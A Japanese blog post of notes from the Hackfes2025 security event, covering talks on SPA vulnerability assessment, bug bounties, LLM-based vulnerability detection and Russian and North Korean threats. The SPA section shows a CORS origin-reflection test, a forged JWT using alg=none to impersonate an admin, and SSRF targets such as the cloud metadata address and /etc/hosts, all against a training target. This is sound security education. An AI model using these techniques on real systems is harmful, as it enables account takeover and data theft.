---
title: "Hackfes2025参加メモ"
date: 2025-07-19T09:10:00+09:00
draft: false
tags: ["セキュリティ"]
--- 
# Hackfes2025参加メモ

## イベント概要
- 日時: 2025年7月19日(土)
- https://hackfes2025.hacker.or.jp

## 「Webアプリケーション（SPA）脆弱性診断入門」徳丸 浩
10:10 - 11:40

Burp Suiteを用いてSPA（Single Page Application）に対する脆弱性診断を実践。
対象は、HTMLとJavaScriptで構成された動的コンテンツ生成型のシンプルなSPAサーバー。

### CORS（Cross-Origin Resource Sharing）の認可不備
ログインAPIへのプリフライトリクエスト（OPTIONSメソッド）は、CORS（Cross-Origin Resource Sharing）によって処理される。

プリフライトリクエスト
```
OPTIONS /api/v1/login HTTP/1.1
Host: api.example.jp
Accept: */*
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: http://spa.example.jp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Sec-Fetch-Dest: empty
Referer: http://spa.example.jp/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Priority: u=1, i
Connection: keep-alive
```

レスポンス
```
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Origin: http://spa.example.jp
Vary: Origin, Access-Control-Request-Headers
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: content-type
Access-Control-Max-Age: 300
Content-Length: 0
Date: Sat, 19 Jul 2025 01:31:57 GMT
```

Burp Repeaterを使ってOriginヘッダーを悪意あるドメインに書き換えたリクエストを送信すると、本来許可されるべきでないオリジンに対してもレスポンスが返ってくることがわかる。
```
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Origin: http://trap.example.jp
Vary: Origin, Access-Control-Request-Headers
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: content-type
Access-Control-Max-Age: 300
Content-Length: 0
Date: Sat, 19 Jul 2025 01:34:06 GMT

```
悪意のあるドメイン（例: trap.example.jp）からでもAPIが操作可能になる。

### パスワード変更時の現在パスワードチェック不備
再認証とパスワード変更が別々のAPIに分かれているため、セッションが有効な状態であれば再認証を省略して直接パスワード変更APIを呼び出すことが可能。

### JWTに対するalg=noneの攻撃
JWTはbase64でエンコードされているjsonなのでデコード可能。
以下のサイトなどでJWTのデコード・エンコードができる。
- https://jwt.io/ja


```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6InFrQTZJVVRXVE1LWXRpbTRGSXFOOFFNY2x3ODd1Tm0yMHU5Nk9rcTh0XzAifQ.eyJzdWIiOjY4LCJ1c2VyaWQiOiJzcGEtdGVzdC0wMzEwIiwiZW1haWwiOiJzcGEtdGVzdC0wMzEwQGdtYWlsLmNvbSIsImljb24iOiJkdW1teS1pY29uLnBuZyIsImlzX3N1cGVyIjowLCJpYXQiOjE3NTI4ODg0NTAsImV4cCI6MTc1Mzc1MjQ1MH0.xGjjwXjql18iSQE2RPQG4qUwqh2y19kY0NjRL7OsWOKYurKmKVLdVfarHf7pA_2_ScFxX4QVfT_dj6Np8M7hM7Tz2LBWuz9OmeD2g2RGlhbWOg0GB5UHik7Dtdx4NYNuZSeIc9WbsQ-MGWNieUKuvMWrw34rs_C5E1SDxn-8LDZ7hnmGd907TtxD4SyJN8z50-fWSqimOS93rHah4GONxfK4erPlndh0qjE_6JgvhiVMkb_qFzG6pi83ETh-rmwOwq97gVc-IRimLmHWOzGaf1S9HXtXbeG6OMkREZI7409CoCYPt2JW5Qp-x4Aq3ulF628iyDgEvJsAV2oiidDs9A
```

デコードされたヘッダー
```
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "qkA6IUTWTMKYtim4FIqN8QMclw87uNm20u96Okq8t_0"
}
```
デコードされたペイロード
```
{
  "sub": 68,
  "userid": "spa-test-0310",
  "email": "spa-test-0310@gmail.com",
  "icon": "dummy-icon.png",
  "is_super": 0,
  "iat": 1752888450,
  "exp": 1753752450
}
```
JWTの署名部はバイナリ形式の署名をBase64エンコードしたものであり、JSON形式ではない。そのため、署名が無効または存在しない場合はペイロードの改ざんが容易になる。

RS256をnoneに書き換える

攻撃者はalgを"none"に変更し、さらにペイロード内の"sub"を1（管理者）に書き換えることで、不正なトークンを生成する。

```
{
  "typ": "JWT",
  "alg": "none",
  "kid": "qkA6IUTWTMKYtim4FIqN8QMclw87uNm20u96Okq8t_0"
}
```
```
{
  "sub": 1,
  "userid": "spa-test-0310",
  "email": "spa-test-0310@gmail.com",
  "icon": "dummy-icon.png",
  "is_super": 0,
  "iat": 1752888450,
  "exp": 1753752450
}
```
再度デコードする
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoicWtBNklVVFdUTUtZdGltNEZJcU44UU1jbHc4N3VObTIwdTk2T2txOHRfMCJ9.eyJzdWIiOjEsInVzZXJpZCI6InNwYS10ZXN0LTAzMTAiLCJlbWFpbCI6InNwYS10ZXN0LTAzMTBAZ21haWwuY29tIiwiaWNvbiI6ImR1bW15LWljb24ucG5nIiwiaXNfc3VwZXIiOjAsImlhdCI6MTc1Mjg4ODQ1MCwiZXhwIjoxNzUzNzUyNDUwfQ.
```

開発者ツール>アプリケーション>Cookieを選択し、Cookieの値を上記で上書きする。

サーバー側の実装によっては、存在しないkidを指定された場合に署名検証をスキップしてしまう場合があり、結果としてalg=noneかつ署名なしのトークンがそのまま通ってしまうことがある。

- https://qiita.com/ockeghem/items/cc0b8ab74f46834d055b


## オブジェクトレベルの認可不備(BOLA)

OWASP API Security Top 10の中でも取り上げられているように、APIにおける認可不備は非常に重大な問題とされている。

パラメータやURL中のID値を別のユーザーのものに変更することで、他人の情報を取得できてしまう。

### オブジェクトプロパティレベルの認可不備

API側でリクエスト内の特定のプロパティに対して適切な認可チェックが行われていない場合、本来変更できないプロパティ（例：`userId`や`role`など）を意図的に書き換えることで、管理対象のオブジェクトを不正に操作することが可能になる。

## 機能レベルの認可不備(BLFA)
権限チェックが不十分な場合、一般ユーザーであっても管理者向けのAPI（例：ユーザー削除や設定変更など）を実行できてしまう。

### XSS
XSSは一般的に「蓄積型」「反射型」「DOM-Based型」の3つに分類されるが、DOM-Based型も蓄積型・反射型にまたがる特性を持つことがあるため、厳密には分類が重複するケースが存在する。

XSS攻撃では、改行コードや文字エンコーディングによってサニタイズ処理を回避される可能性があるため、出力処理の設計に注意が必要。
Cookieは盗めなくても、apiを任意に呼び出せるのがXSSの怖さ。

### SSRF
攻撃者は外部からアクセス可能なサーバーを踏み台にして、社内ネットワークやクラウド環境内の非公開サーバーへリクエストを送信できる。

SSRFの攻撃対象例：
- `file:///etc/hosts`：ローカルファイルを読み取る試み
- `http://169.254.169.254/`：AWS等のクラウド環境におけるメタデータサービス（IMDS）へのアクセス
- `http://localhost:NNNN/`：アプリケーションが内部で利用しているローカルサービスへのアクセス（NNNNはポート番号）

## 「バグバウンティ入門 〜バグハンターへの道のり〜」森岡 優太
12:40 - 14:10
写真撮影禁止だったので詳細なハンズオン内容は割愛。


バグハンターと導入企業の仲介役としてバグバウンティプラットフォームが存在する。

### バグバウンティプラットフォームの例
3大バグバウンティプラットフォーム
- hackerone(アメリカ)
- bugcrowd(アメリカ)
- intigity(ベルギー)

日本のバグバウンティプラットフォーム
- issuehunt(日本)

プログラムの種類
- BBP：報奨金が支払われるプログラム
- VDP：脆弱性報告窓口として機能するプログラム。報奨金は支払われない。

よく使われるツールまとめ
- https://www.lopseg.com.br/osint
- https://github.com/vavkamil/awesome-bugbounty-tools

## 「LLM を活用したソースコードにおける脆弱性の検出」蔀 綾人
16:00-16:45

静的診断：ASTを用いたコード解析
動的診断：パラメーターのファジング

### LLMを用いた脆弱性発見の手法
1. Ajax関数の特定
2. Ajaxで呼び出される関数の木構造を作成する
3. 呼び出される一覧の作成
4. LLMによる汚染解析/従来の汚染解析
5. 結果とPoCの作成

## 「サイバーセキュリティ概念のバーチャルからリアルへの応用 ~対ロシア、対北朝鮮の脅威への対処法~」Yulii_Smirnov
16:45 - 17:30

バーチャルなサイバー攻撃が、どう現実世界に影響を与えるかに焦点を当てた講演。

### 国際電話型の特殊詐欺
- 末尾0110の番号で警察署を騙る
- 大量の携帯・SIM-BOX・偽基地局などを使い発信元を偽装
- 詐欺と通信技術が結びついている

### 自動車盗難デバイス「GameBoy（Code Grabber）」
- 日本車の中古需要が高いロシアで普及
- リモコンキーの信号をクローンして解錠
- 背後にはFSBやSVR関連のフロント企業の関与も

### 違法無線と北朝鮮
- Glocom（マレーシアにある北朝鮮系フロント企業）
- 違法無線機器の製造と販売、制裁逃れ

### ロシアのサイバー攻撃の戦略
- ハイブリッド戦の一環としてサイバー攻撃を活用
- デジタル攻撃は入口、目的はリアル世界への影響
- 「マスキロフカ」（偽装戦術）との関連性も

### OSINT組織の紹介
- https://roles.rcast.u-tokyo.ac.jp
- https://deepdive.or.jp
- オープン情報から脅威を検出・分析する取り組み
